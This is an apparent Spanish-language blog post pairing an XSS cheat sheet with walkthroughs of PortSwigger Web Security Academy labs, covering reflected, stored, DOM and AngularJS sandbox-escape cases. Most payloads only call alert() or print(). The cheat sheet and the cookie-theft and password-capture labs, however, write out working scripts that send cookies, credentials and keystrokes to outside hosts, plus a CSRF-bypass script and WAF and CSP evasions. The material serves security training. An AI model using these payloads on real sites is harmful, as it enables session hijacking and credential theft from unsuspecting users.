---
layout: single
title: XSS - PortSwigger
excerpt: "All Cross-site Scripting labs of PortSwigger with additional CheetSheet."
date: 2025-07-29
classes: wide
header:
  teaser: /img2/images/portswigger.png
  teaser_home_page: true
  icon: /img2/images/burp.jpg
categories:
  - portswigger
  - Web
tags:
  - Burpsuite
  - XSS
  - XSS CheetSheet
---


## XSS CheetSheet

https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

### Initial Payloads 

- Common JavaScript

```html
<script>alert(1)</script>
```

```html
<script>alert('XSS');</script>
```

```html
<img src=0 onerror=alert(1)>
```

```html
<body onload=alert(1)>
```

```html
<input onfocus=alert(1) autofocus>
```

```html
<a href="javascript:alert(1)">Test</a>
```

```html
<svg><animatetransform onbegin=alert(1)</svg>
```

```javascript
${alert(1)}
```

### Special Functions

```html
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/#" onload="this.src+='<img src=0 onerror=print()>'"></iframe>
```

```javascript
autofocus tabindex=1 onfocus=alert(1)
```

```javascript
tabindex=1 onfocus=alert(1) id=xss    // https://test.com/#xss
```

```javascript
"onmouseover="alert(1)
```

```javascript
eval('var searchResultsObj = ' + alert(1))
```

```javascript
accesskey='x'onclick='alert(1)
```

- AngularJS 1.4.4 evasion

```javascript
toString().constructor.prototype.charAt=[].join;
[1,2]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)
```

- AngularJS 1.4.4 CSP evasion

```html
<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(1)'>
```

- Encoding

```javascript
HTML encode --> &apos;
HTML decimal --> &#39;
HTML hex --> &#x27;
```

```javascript
[1,2]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)
```

### Explotation Methods

- Robo de cookies

```html
<script>
var request = XMLHttpRequest();
request.open('GET','https://gtdnm8w84ckzue4nnih40u07oyurii67.oastify.com/?cookie='+document.cookie);
request.send();
</script>
```

```html
<script>
fetch('https://gtdnm8w84ckzue4nnih40u07oyurii67.oastify.com/?cookie='+document.cookie);
</script>
```

```html
<script>
fetch('https://gtdnm8w84ckzue4nnih40u07oyurii67.oastify.com/?cookie='+btoa(document.cookie));
</script>
```

- Phishing

```html
<input name=username id=username onchange="fetch('https://g2jnv858dctz3ednwiq49u97xy3vrlfa.oastify.com/?username='+this.value)"><br>
<input type=password name=password id=password onchange="fetch('https://g2jnv858dctz3ednwiq49u97xy3vrlfa.oastify.com/?password='+this.value)">
```

```html
<script>
  var email = prompt("Por favor, introduce tu correo electrónico para visualizar el post", "example@example.com");

  if (email == null || email == ""){
    alert("Es necesario introducir un correo válido para visualizar el post");
  } else {
    fetch("http://192.168.1.144/?email=" + email);
  }
</script>
```

- Keylogger

```html
<script>
  var k = "";
  document.onkeypress = function(e){
    e = e || window.event;
    k += e.key;
    var i = new Image();
    i.src = "http://192.168.1.144/"+k;
  };  
</script>
```

## JavaScript Special Functions

- Version AngularJS

```javascript
angular.version.full
```

- Redirect

```html
<script>
location="https://test.com"
</script>
```

```html
<script>
window.location.href="http://192.168.1.144:80"
</script>
```

- Petición por post

```javascript
var domain = "http://localhost:10007/newgossip";
var req1 = new XMLHttpRequest();
req1.open('GET', domain, false);
req1.withCredentials= true;
req1.send();

var response = req1.responseText;
var parser = new DOMParser();
var doc = parser.parseFromString(response, 'text/html');
var token = doc.getElementsByName("_csrf_token")[0].value;

var req2 = new XMLHttpRequest();
var data= "title=HACKED&subtitle=HACKED&text=HACKED&_csrf_token="+token;
req2.open('POST', 'http://localhost:10007/newgossip', false);
req2.withCredentials= true;
req2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
req2.send(data);
```

```html
<script>
window.onload = function() {
  var token = document.querySelector('input[name="csrf"]').value;
  
  var domain = "https://0ace00ae049f92cb8051bc93006f00a4.web-security-academy.net/my-account/change-email";
  
  var req = new XMLHttpRequest();
  var data = "email=test%40test.com&csrf=" + encodeURIComponent(token);
  req.open('POST', domain);
  req.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
  req.send(data);
};
</script>
```

- Funciones flecha (Sin paréntesis)

```html
<script>
a=a =>{throw onerror=alert,1},toString=a,window + 'test'
</script>
```

```html
<script>
a=a =>{
throw onerror=alert,1;
};
toString=a;
window + 'test';
</script>
```

## XSS reflejado en HTML sin codificación || Reflected XSS into HTML context with nothing encoded

![](/img2/Pasted%20image%2020250721134851.png)

![](/img2/Pasted%20image%2020250721135555.png)

## XSS almacenado en HTML sin codificación || Stored XSS into HTML context with nothing encoded

![](/img2/Pasted%20image%2020250721142446.png)

![](/img2/Pasted%20image%2020250721142610.png)

> Antes de probar una inyección XSS, podemos probar una etiqueta html, para ver que campo puede ser vulnerable, esto no asegura la inyección pero nos da una guía.

![](/img2/Pasted%20image%2020250721142807.png)

![](/img2/Pasted%20image%2020250721142847.png)

> Al ser una inyección XSS almacenada, cada vez que un usuario entre al blog, ejecutará el código javascript.

- Inyection

```html
<script>alert(1)</script>
```

## XSS DOM con 'document.write' y 'location.search' || DOM XSS in document.write sink using source location.search

![](/img2/Pasted%20image%2020250721164338.png)

![](/img2/Pasted%20image%2020250721164002.png)

```javascript
function trackSearch(query) {
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
}
var query = (new URLSearchParams(window.location.search)).get('search');
if(query) {
	trackSearch(query);
}   
```

> Vemos que por detrás el servidor está inyectando en nuestro navegador una etiqueta img, alterando así el DOM de la web.

![](/img2/Pasted%20image%2020250721165237.png)

![](/img2/Pasted%20image%2020250721165352.png)

> Vemos que cerrando las comillas y la etiqueta de img, podemos inyectar una etiqueta html en el DOM, la representación por detrás quedaría así:

```javascript
document.write('<img src="/resources/images/tracker.gif?searchTerms="><h1>Testing</h1>
">');
```

![](/img2/Pasted%20image%2020250721165903.png)

![](/img2/Pasted%20image%2020250721165930.png)

- Inyection

```html
"><script>alert(1)</script>
```

## XSS DOM con 'innerHTML' y 'location.search' || DOM XSS in innerHTML sink using source location.search

![](/img2/Pasted%20image%2020250721185528.png)

![](/img2/Pasted%20image%2020250721185648.png)

```javascript
 function doSearchQuery(query) {
	 document.getElementById('searchMessage').innerHTML = query;
}
var query = (new URLSearchParams(window.location.search)).get('search');
if(query) {
	doSearchQuery(query);
}
```

> Vemos que por detrás se está ejecutando la función innerHTML, la cual inserta nuestro input dentro del DOM. Esta función es parecida a la anterior document.write, solo que de manera menos forzosa, sin sobrescribir nada.

![](/img2/Pasted%20image%2020250721190101.png)

![](/img2/Pasted%20image%2020250721190027.png)

> Al inyectar una etiqueta HTML vemos que se introduce en el DOM y lo muestra por pantalla, sabiendo esto, podemos probar a inyectar código javascript.

![](/img2/Pasted%20image%2020250721190838.png)

> Vemos que la etiqueta script no funciona, sin embargo, podemos probar otras alternativas.

![](/img2/Pasted%20image%2020250721191225.png)

![](/img2/Pasted%20image%2020250721191257.png)

![](/img2/Pasted%20image%2020250721191335.png)

![](/img2/Pasted%20image%2020250721191358.png)

- Inyection

```html
<img src=0 onerror=alert(1)>
```

## XSS DOM en 'href' con jQuery y 'location.search' || DOM XSS in jQuery anchor href attribute sink using location.search source

![](/img2/Pasted%20image%2020250721203048.png)

![](/img2/Pasted%20image%2020250721203322.png)

![](/img2/Pasted%20image%2020250721203835.png)

```javascript
$(function() {
	$('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
});               
```

> Esta función inserta en el atributo el valor de la función returnPath en la etiqueta que contenga el id 'backLink', es decir en el botón 'Back'.

![](/img2/Pasted%20image%2020250721203917.png)

![](/img2/Pasted%20image%2020250721203947.png)

> La etiqueta final quedaría tal que así:

```html
<a id="backLink" href="javascript:alert(1)">Back</a>
```

- Injection

```javascript
javascript:alert(1)
```

## XSS DOM con jQuery y evento 'hashchange' || DOM XSS in jQuery selector sink using a hashchange event

![](/img2/Pasted%20image%2020250721232427.png)

```javascript
$(window).on('hashchange', function(){
  var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
    if (post) post.get(0).scrollIntoView();
});
```

> Vamos ha desglosar parte por parte el script:

```javascript
window.location.hash.slice(1)
```

![](/img2/Pasted%20image%2020250721233118.png)

> La función window.location.hash.slice(1) devuelve el contenido del '#' en la url.

```javascript
$('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')'); 
```

![](/img2/Pasted%20image%2020250721233400.png)

> En este caso el contenido del operador $() devuelve un objeto con la etiqueta h2.

![](/img2/Pasted%20image%2020250722132643.png)

![](/img2/Pasted%20image%2020250722132814.png)

> Para ver cuando se ejecuta la función podemos poner una traza, la cual cada vez que se ejecuta la función nos muestra el mensaje "TESTING" en la consola. 

![](/img2/Pasted%20image%2020250722160737.png)

> Si probamos el selector jQuery en la consola, vemos que al inyectar un código javascript malicioso logramos la ejecución del mismo, esto se debe a que el selector jQuery crea un nodo temporal el cual genera una etiqueta html en el DOM.

![](/img2/Pasted%20image%2020250722161002.png)

> Si inyectamos el código malicioso en la url después del hash logramos el XSS. Sin embargo, todavía no hemos logrado explotar la vulnerabilidad, ya que únicamente se ejecuta la función una vez se cambia la ruta después del hash.

![](/img2/Pasted%20image%2020250722161554.png)

![](/img2/Pasted%20image%2020250722161625.png)

 > Con la etiqueta 'iframe' podemos crear una réplica de la web, de esta forma podemos cargar una instrucción después de cargar la web.

![](/img2/Pasted%20image%2020250722162019.png)

![](/img2/Pasted%20image%2020250722162107.png)

> De esta forma la víctima cargará la web y posteriormente introducirá la inyección después del hash.

- Injection

```html
<iframe src=https://0a3b009o0458243d802a764800a800ca.web-security-academy.net/# onload="this.src+='<img src=0 onerror=print()>'">
```

## XSS reflejado en atributo con corchetes codificados || Reflected XSS into attribute with angle brackets HTML-encoded

![](/img2/Pasted%20image%2020250722173410.png)

![](/img2/Pasted%20image%2020250722173502.png)

> Hemos logrado cerrar el atributo value, sin embargo, no hemos conseguido insertar una nueva etiqueta debido a la codificación de los símbolos <>.

![](/img2/Pasted%20image%2020250722173924.png)

![](/img2/Pasted%20image%2020250722174011.png)

> Tenemos la capacidad de crear un nuevo atributo dentro de la etiqueta 'input'.

![](/img2/Pasted%20image%2020250722174534.png)

![](/img2/Pasted%20image%2020250722174601.png)

![](/img2/Pasted%20image%2020250722174833.png)

> Creamos dos nuevos atributos, onfocus ejecuta el código javascript y el autofocus ejecuta el atributo onfocus nada más cargar la página.

- Injection

```javascript
" autofocus onfocus=alert(1) //
```

## XSS almacenado en 'href' con comillas codificadas || Stored XSS into anchor href attribute with double quotes HTML-encoded

![](/img2/Pasted%20image%2020250722184711.png)

![](/img2/Pasted%20image%2020250722184839.png)

> Vemos que no existe ningún tipo de validación a la hora de meter una url.

![](/img2/Pasted%20image%2020250722185044.png)

![](/img2/Pasted%20image%2020250722185214.png)

- Injection

```javascript
javascript:alert(1)
```

## XSS reflejado en string JS con corchetes codificados || Reflected XSS into a JavaScript string with angle brackets HTML encoded

![](/img2/Pasted%20image%2020250722190352.png)

```javascript
var searchTerms = 'test'; 
document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');             
```

> Vemos que tenemos la capacidad de insertar contenido dentro de un script.

![](/img2/Pasted%20image%2020250722190944.png)

![](/img2/Pasted%20image%2020250722191008.png)

> Tenemos varias formas de inyectar código malicioso:

```javascript
var searchTerms = '';alert(1);//'; 
document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');             
```

```javascript
var searchTerms = '';alert(1);';'; document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');             
```

```javascript
var searchTerms = '';alert(1); var test='test'; document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');             
```

- Injection

```javascript
';alert(1);//
```

```javascript
';alert(1);';
```

```javascript
';alert(1); var test='test
```

## XSS DOM con 'document.write' dentro de 'select' || DOM XSS in document.write sink using source location.search inside a select element

![](/img2/Pasted%20image%2020250722200531.png)

```javascript
var stores = ["London", "Paris", "Milan"];
var store = (new URLSearchParams(window.location.search)).get('storeId');
document.write('<select name="storeId">');
if (store) {
    document.write('<option selected>' + store + '</option>');
}
for (var i = 0; i < stores.length; i++) {
    if (stores[i] === store) {
        continue;
    }
    document.write('<option>' + stores[i] + '</option>');
}
document.write('</select>');
```

> Analizando el código vemos que tenemos control sobre la variable store, que es el resultado del parámetro storeId. La variable store es utilizada para insertar una etiqueta 'option' en el DOM.

![](/img2/Pasted%20image%2020250722200953.png)

> Para controlar el parámetro storeId podemos añadirlo como parte de la url.

![](/img2/Pasted%20image%2020250722201109.png)

![](/img2/Pasted%20image%2020250722201138.png)

- Injection

```html
&storeId=<script>alert(1)</script>
```

## XSS DOM en AngularJS con comillas codificadas || DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded

![](/img2/Pasted%20image%2020250722224154.png)

> Vemos que se está usando el framework de AngularJS

![](/img2/Pasted%20image%2020250722224249.png)

![](/img2/Pasted%20image%2020250722224501.png)

## XSS DOM reflejado || Reflected DOM XSS

![](/img2/Pasted%20image%2020250723000347.png)

![](/img2/Pasted%20image%2020250723000431.png)

> Vemos una función eval(), la cual puede llegar a ejecutar código javascript.

![](/img2/Pasted%20image%2020250723002246.png)

> Interceptando la petición al ejecutar el script, vemos que tenemos el control del campo searchTerm, lo cual se vería así dentro de la función eval():

```javascript
eval('var searchResultsObj = ' + '{"results":[],"searchTerm":"testing123"}')
```

![](/img2/Pasted%20image%2020250723002454.png)

> Al intentar escapar de la query vemos que el servidor nos escapa las comillas.

![](/img2/Pasted%20image%2020250723002616.png)

> De esta forma evitamos el bloque de las comillas.

![](/img2/Pasted%20image%2020250723002758.png)

![](/img2/Pasted%20image%2020250723002822.png)

> La query final quedaría tal que así:

```javascript
eval('var searchResultsObj = ' + '{"results" [],"searchTerm":"testing123\\"}+alert(1)//"}')
```

- Injection

```javascript
testing123\"}+alert(1)//
```

## XSS DOM almacenado || Stored DOM XSS

![](/img2/Pasted%20image%2020250723171930.png)

![](/img2/Pasted%20image%2020250723172029.png)

> Vemos que por detrás el servidor está empleando alguna sanetización sobre los símbolos <>, adémas vemos que se está ejecutando un script donde seguramente se emplee está sanetización.

![](/img2/Pasted%20image%2020250723172251.png)

![](/img2/Pasted%20image%2020250723172409.png)

> Revisando el script vemos un error en la sanetización de los símbolos <>. La función replace() solo remplaza el primer match, para remplazar todo se debería de usar la función replaceAll().

![](/img2/Pasted%20image%2020250723172557.png)

![](/img2/Pasted%20image%2020250723172641.png)

![](/img2/Pasted%20image%2020250723172725.png)

> Poniendo <> conseguimos saltar la sanetización e inyectar una nueva etiqueta en el DOM.

![](/img2/Pasted%20image%2020250723172842.png)

![](/img2/Pasted%20image%2020250723172915.png)

- Injection

```html
<><img src=0 onerror=alert(1)>
```

## XSS reflejado en HTML con etiquetas bloqueadas || Reflected XSS into HTML context with most tags and attributes blocked

![](/img2/Pasted%20image%2020250723184445.png)

![](/img2/Pasted%20image%2020250723184510.png)

> Vemos que existe un WAF, el cual bloquea algunas etiquetas.

![](/img2/Pasted%20image%2020250723184610.png)

![](/img2/Pasted%20image%2020250723184722.png)

> Metiendo una etiqueta falsa podemos intuir que no se trata de un bloqueo de los símbolos <>, sino un bloqueo de algunas etiquetas.

![](/img2/Pasted%20image%2020250723185218.png)

![](/img2/Pasted%20image%2020250723185316.png)

> La etiqueta 'body' no ha sido interceptada por el WAF, sabiendo esto, podemos implementar un evento dentro de la etiqueta.

![](/img2/Pasted%20image%2020250723185807.png)

![](/img2/Pasted%20image%2020250723200047.png)

> Entre todas los eventos posibles el más factible es el evento 'onresize', el cual nos permite ejecutar código javascript despues de hacer un resize de pantalla.

![](/img2/Pasted%20image%2020250723200227.png)

![](/img2/Pasted%20image%2020250723223043.png)

> Hemos logrado efectuar el XSS, sin embargo, el código javascript solo se ejecuta cuando hacemos zoom en la pantalla.

![](/img2/Pasted%20image%2020250723195542.png)

![](/img2/Pasted%20image%2020250723223409.png)

> De esta forma cargamos un frame de la url con la inyección, una vez cargada la url hace un resize de la pantalla, ejecutando así el evento 'onresize'.

- Injection

```html
<iframe src="https://0a3b009o0458243d802a764800a800ca.web-security-academy.net/?search=<body onresize=print()>" onload="this.style.width='100px'">
```

## XSS reflejado con solo etiquetas personalizadas || Reflected XSS into HTML context with all tags blocked except custom ones

![](/img2/Pasted%20image%2020250724125855.png)

![](/img2/Pasted%20image%2020250724125925.png)

> Igual que el laboratorio anterior, las etiquetas html están bloqueadas por un WAF.

![](/img2/Pasted%20image%2020250724130850.png)

![](/img2/Pasted%20image%2020250724130935.png)

> Las etiquetas personalizadas están permitidas, sabiendo esto podemos inyectar algún evento.

![](/img2/Pasted%20image%2020250724132004.png)

![](/img2/Pasted%20image%2020250724132053.png)

> Vemos que al hacer focus en la etiqueta test se establece el ataque XSS, para que esto sea automático para la víctima podemos hacerlo de dos formas:

- Forma con autofocus

![](/img2/Pasted%20image%2020250724132256.png)

![](/img2/Pasted%20image%2020250724132322.png)

![](/img2/Pasted%20image%2020250724132742.png)

> Parecido a cuando empleamos la etiqueta 'iframe', podemos rederigir directamente a la víctima hacia la url maliciosa.

- Forma con id y hash

![](/img2/Pasted%20image%2020250724132923.png)

![](/img2/Pasted%20image%2020250724133000.png)

> Al poner un id en la etiqueta podemos hacer 'focus' en ella usando un hash en la url.

![](/img2/Pasted%20image%2020250724133149.png)

![](/img2/Pasted%20image%2020250724133220.png)

- Injection

```html
<script>
location="https://0a3b009o0458243d802a764800a800ca.web-security-academy.net/?search=<test onfocus=alert(document.cookie) tabidex=1 id=test>#test"
</script>
```

```html
<script>
location="https://0a3b009o0458243d802a764800a800ca.web-security-academy.net/?search=<test onfocus=alert(document.cookie) autofocus tabidex=1>"
</script>
```

## XSS reflejado con etiquetas SVG permitidas || Reflected XSS with some SVG markup allowed


![](/img2/Pasted%20image%2020250724135842.png)

![](/img2/Pasted%20image%2020250724135913.png)

> Igual que los anteriores laboratorios, también tenemos un bloqueo de etiquetas por parte de un WAF.

![](/img2/Pasted%20image%2020250724140836.png)

![](/img2/Pasted%20image%2020250724140917.png)

> Viendo las etiquetas permitidas vemos que tenemos una vía potencial para realizar un XSS con las etiquetas 'svg' y 'animatetransform'.

![](/img2/Pasted%20image%2020250724145438.png)

![](/img2/Pasted%20image%2020250724145522.png)

> El único evento que pasa el bloqueo del WAF es 'onbegin', el cual permite ejecutar código javascript al realizar una animación.

![](/img2/Pasted%20image%2020250724145821.png)

![](/img2/Pasted%20image%2020250724150030.png)

> Creando un 'svg' podemos ejecutar el código javascript con el evento 'onbegin', el cual es activado por la etiqueta 'animatetransform'.

- Injection

```html
<svg><animatetransform onbegin=alert(1)</svg>
```

## XSS reflejado en etiqueta canonical || Reflected XSS in canonical link tag

![](/img2/Pasted%20image%2020250724220440.png)

> Vemos que tenemos el control dentro de la etiqueta 'link' cambiando la url principal.

![](/img2/Pasted%20image%2020250724220726.png)

> Poniendo una comilla simple vemos que no está sanetizado y podemos escapar del atributo 'href', esto nos permite crear otro atributo.

![](/img2/Pasted%20image%2020250724221053.png)

![](/img2/Pasted%20image%2020250724221231.png)

> Bindeamos un atajo que cuando sea pulsado ejecutará el evento 'onclick' con el código javascript.

- Injection

```javascript
?'accesskey='x'onclick='alert(1)
```

## XSS en string JS con comilla y backslash escapados || Reflected XSS into a JavaScript string with single quote and backslash escaped

![](/img2/Pasted%20image%2020250724224539.png)

![](/img2/Pasted%20image%2020250724224626.png)

```javascript
var searchTerms = 'testing123'; document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');                    
```

> Vemos que tenemos control sobre una variable dentro de un script, podemos intentar escapar de las comillas y ejecutar código malicioso.

![](/img2/Pasted%20image%2020250724224821.png)

![](/img2/Pasted%20image%2020250724224943.png)

> El servidor nos está escapando las comillas y las barras invertidas, sabiendo esto podemos probar otras alternativas.

![](/img2/Pasted%20image%2020250724225047.png)

![](/img2/Pasted%20image%2020250724225156.png)

> De esta forma conseguimos cerrar la etiqueta 'script' y salir del contexto del string.

![](/img2/Pasted%20image%2020250724225324.png)

![](/img2/Pasted%20image%2020250724225347.png)

- Injection

```html
</script><script>alert(1)</script>
```

## XSS en JS con comillas, corchetes y comilla escapada || Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped

![](/img2/Pasted%20image%2020250725132118.png)

![](/img2/Pasted%20image%2020250725132210.png)


```javascript
var searchTerms = 'testing123'; document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');                    
```

> Mismo escenario que el laboratorio anterior, tenemos el input de una variable dentro de un script.

![](/img2/Pasted%20image%2020250725132404.png)

![](/img2/Pasted%20image%2020250725132501.png)

> Con la barra invertida hemos conseguido escapar la comilla que cierra el string, además si nos fijamos el script no se ha ejecutado correctamente, ya que, la etiqueta 'img' que se creaba a partir del script no se ha creado correctamente.

![](/img2/Pasted%20image%2020250725132911.png)

![](/img2/Pasted%20image%2020250725133040.png)

- Injection

```javascript
\';alert(1);//
```

## XSS almacenado en 'onclick' con codificación completa || Stored XSS into onclick event with angle brackets and double quotes HTML-encoded and single quotes and backslash escaped

![](/img2/Pasted%20image%2020250725204408.png)

![](/img2/Pasted%20image%2020250725204505.png)

```html
<a id="author" href="http://test.com" onclick="var tracker={track(){}};tracker.track('http://test.com');">Test</a>
```

> Vemos que tenemos el control de la url dentro del atributo 'onclick'.

![](/img2/Pasted%20image%2020250725204846.png)

![](/img2/Pasted%20image%2020250725204936.png)

> Como la web nos está escapando las comillas simples y las barras invertidas, podemos interpretar la comilla simple con HTML encode. Podemos interpretarlas de tres formas:

```javascript
HTML encode --> &apos;
HTML decimal --> &#39;
HTML hex --> &#x27;
```

![](/img2/Pasted%20image%2020250725205246.png)

![](/img2/Pasted%20image%2020250725205336.png)

```html
<a id="author" href="http://test.com" onclick="var tracker={track(){}};tracker.track('http://test.com');alert(1);//')">test</a>
```

- Injection

```javascript
http://test.com&apos;);alert(1);//
```

```javascript
http://test.com&#39;);alert(1);//
```

```javascript
http://test.com&#x27;);alert(1);//
```

## XSS en template literal con caracteres unicode escapados || Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped

![](/img2/Pasted%20image%2020250725224007.png)

![](/img2/Pasted%20image%2020250725224142.png)

> En este caso, tenemos el control de un string dentro de un template literal. Sabemos que es un template literal debido a las backtricks.

![](/img2/Pasted%20image%2020250725224709.png)

![](/img2/Pasted%20image%2020250725224817.png)

> Cuando estemos dentro de un template literal podemos hacer uso del operador ${}.

- Injection

```javascript
${alert(1)}
```

## Robo de cookies mediante XSS || Exploiting cross-site scripting to steal cookies

![](/img2/Pasted%20image%2020250725234505.png)

![](/img2/Pasted%20image%2020250725234538.png)

> Primero detectamos la vulnerabilidad de stored XSS en los comentarios.

![](/img2/Pasted%20image%2020250725235035.png)

![](/img2/Pasted%20image%2020250725235138.png)

![](/img2/Pasted%20image%2020250725235304.png)

- Injection

```html
<script>
var request = XMLHttpRequest();
request.open('GET','https://gtdnm8w84ckzue4nnih40u07oyurii67.oastify.com/?cookie='+document.cookie);
request.send();
</script>
```

## Captura de contraseñas mediante XSS || Exploiting cross-site scripting to capture passwords

![](/img2/Pasted%20image%2020250726011301.png)

![](/img2/Pasted%20image%2020250726011407.png)

![](/img2/Pasted%20image%2020250726011454.png)

- Injection

```html
<input name=username id=username onchange="fetch('https://g2jnv858dctz3ednwiq49u97xy3vrlfa.oastify.com/?username='+this.value)"><br>
<input type=password name=password id=password onchange="fetch('https://g2jnv858dctz3ednwiq49u97xy3vrlfa.oastify.com/?password='+this.value)">
```

## Evasión de CSRF usando XSS  || Exploiting XSS to bypass CSRF defenses

![](/img2/Pasted%20image%2020250726014055.png)

![](/img2/Pasted%20image%2020250726014219.png)

> Para realizar la petición que cambia el correo de la cuenta necesitamos el token 'csrf' personal de cada usuario, este token se encuentra en la etiqueta 'input' la cual está oculta.

![](/img2/Pasted%20image%2020250726014446.png)

> Para obtener el token podemos buscar por el valor de la etiqueta 'input' con el nombre 'csrf'

![](/img2/Pasted%20image%2020250726013935.png)

> La función 'window.onload' es necesaria debido a que si queremos obtener el token del DOM es necesario cargar primero la web.

- Injection

```html
<script>
window.onload = function() {
  var token = document.querySelector('input[name="csrf"]').value;
  
  var domain = "https://0ace00ae049f92cb8051bc93006f00a4.web-security-academy.net/my-account/change-email";
  
  var req = new XMLHttpRequest();
  var data = "email=test%40test.com&csrf=" + encodeURIComponent(token);
  req.open('POST', domain);
  req.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
  req.send(data);
};
</script>
```

## Escape de sandbox AngularJS sin cadenas || Reflected XSS with AngularJS sandbox escape without strings

![](/img2/Pasted%20image%2020250726170208.png)

![](/img2/Pasted%20image%2020250726170259.png)

```javascript
angular.module('labApp', []).controller('vulnCtrl',function($scope, $parse) {
$scope.query = {};
var key = 'search';
$scope.query[key] = 'testing123';
$scope.value = $parse(key)($scope.query);
});
```

> Vamos a desglosar el script:

> 1. Crea un módulo con el nombre 'labApp'. Un módulo en AngularJS es un contenedor para agrupar componentes como controladores, servicios, etc. Su objetivo es organizar el código.
> 2. Crea un controlador con el nombre 'vulnCtrl' con las dependencias $scope y $parse. Un controlador se usa para definir la lógica y el estado que usa la vista. 
> 3. $scope es el objeto compartido entre el controlador y la vista en el HTML. $parse es un servicio que convierte una cadena en una expresión Angular ejecutable.
> 4. Crea un objeto vacío llamado query dentro del $scope.
> 5. Se define la variable 'key' sacada del parámetro 'search'.
> 6. Crea el valor del objeto 'query', como resultado: {search : 'testing123'}
> 7. (PARTE VULNERABLE) Por útlimo, se utiliza la dependencia $parse sobre la clave del objeto 'query'.

![](/img2/Pasted%20image%2020250727170207.png)

> Antes de intentar insertar cualquier payload es necesario revisar la versión de AngularJS.

![](/img2/Pasted%20image%2020250727170556.png)

> Al insertar un nuevo parámetro, se crea una nueva variable 'key'.

![](/img2/Pasted%20image%2020250727170747.png)

```javascript
toString().constructor.prototype.charAt=[].join;
[1,2]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)
```

> Con este payload ofuscado y url-encodeado logramos que $parse ejecute esta instrucción.

> El payload se divide en dos partes:
> 1. "Deshabilita" la función 'charAt', la cual es utilizada internamente para evaluar si una carga es maliciosa.
> 2. Aprovecha la función 'orderBy' para ejecutar una carga maliciosa obfuscada.

- Injection

```javascript
testing&toString().constructor.prototype.charAt=[].join;
[1,2]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)
```

## Escape de sandbox AngularJS con CSP || Reflected XSS with AngularJS sandbox escape and CSP

![](/img2/Pasted%20image%2020250727195107.png)

> Primero detectamos la versión de AngularJS

![](/img2/Pasted%20image%2020250727195154.png)

![](/img2/Pasted%20image%2020250727195256.png)

![](/img2/Pasted%20image%2020250727195345.png)

![](/img2/Pasted%20image%2020250727195414.png)

> Vemos que nos interpreta las etiquetas HTML y las instrucciones de AngularJS, sin embargo, al intentar ejecutar código malicioso, la web no lo interpreta.  Probablemente por detrás se esté empleando una política CSP.

![](/img2/Pasted%20image%2020250727200013.png)

![](/img2/Pasted%20image%2020250727200043.png)

> Este payload crea un input con la directiva 'ng-focus' la cual ejecuta la función '$event.composedPath()' la cual devuelve un array de varias etiquetas HTML. Gracias a este array podemos aplicarle el filtro 'orderBy' donde le pasamos la variable 'z' que ejecuta la instrucción 'alert(1)'. Para ejecutar la directiva 'ng-focus' podemos crear un 'id' y hacer referencia con el hash '#x' en la url.

![](/img2/Pasted%20image%2020250727205214.png)

![](/img2/Pasted%20image%2020250727205308.png)

- Injection

```html
<script>
location="https://0a8500a904fa3029801458f8003500af.web-security-academy.net/?search=%3Cinput+id%3Dx+ng-focus%3D%24event.composedPath%28%29%7CorderBy%3A%27%28z%3Dalert%29%281%29%27%3E#x"
</script>
```

## XSS con eventos y atributos bloqueados || Reflected XSS with event handlers and href attributes blocked

![](/img2/Pasted%20image%2020250727233612.png)

![](/img2/Pasted%20image%2020250727233801.png)

![](/img2/Pasted%20image%2020250727233844.png)

> Haciendo un poco de fuzzing podemos descubrir que etiquetas están permitidas.

![](/img2/Pasted%20image%2020250727234300.png)

![](/img2/Pasted%20image%2020250727234210.png)

- Injection

```html
<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=150>Click</text></a></svg>
```

## XSS en javascript: con caracteres limitados || Reflected XSS in a JavaScript URL with some characters blocked

![](/img2/Pasted%20image%2020250728162616.png)

```html
<a href="javascript:fetch('/analytics', {method:'post',body:'/post?postId=INPUT}).finally(_ => window.location = '/')">Back to Blog</a>
```

> Nuestro input se encuentra dentro de un script con la función 'fetch'.

![](/img2/Pasted%20image%2020250728163006.png)

![](/img2/Pasted%20image%2020250728163056.png)

> Podemos insertar contenido usando el símbolo &, de esta forma evitamos tener que introducir un número entero.

```html
<script>
a=a =>{
throw onerror=alert,1;
};
toString=a;
window + 'test';
</script>
```

> Como los paréntesis están bloqueados, podemos crear la función de otra forma. Usando las funciones flecha crearmos la función la cual lanza una excepción con el evento 'onerror', este es lanzado automáticamente ejecutando el 'alert'. Para llamar a la función podemos igualar la función interna de JavaScript 'toString'  por nuestra función 'a'. Para que se ejecute 'toString' podemos hacer una suma de la funcionalidad 'window' con el string 'test' que, internamente, JavaScript ejecutará la función 'toString' sobre 'window'.


![](/img2/Pasted%20image%2020250728175708.png)

- Injection

```javascript
&'},a=a=>{throw onerror=alert,1},toString=a,window%2B'test'},{x:'
```

## XSS con CSP estricto y marcado colgante || Reflected XSS protected by very strict CSP, with dangling markup attack

![](/img2/Pasted%20image%2020250729125125.png)

![](/img2/Pasted%20image%2020250729125207.png)

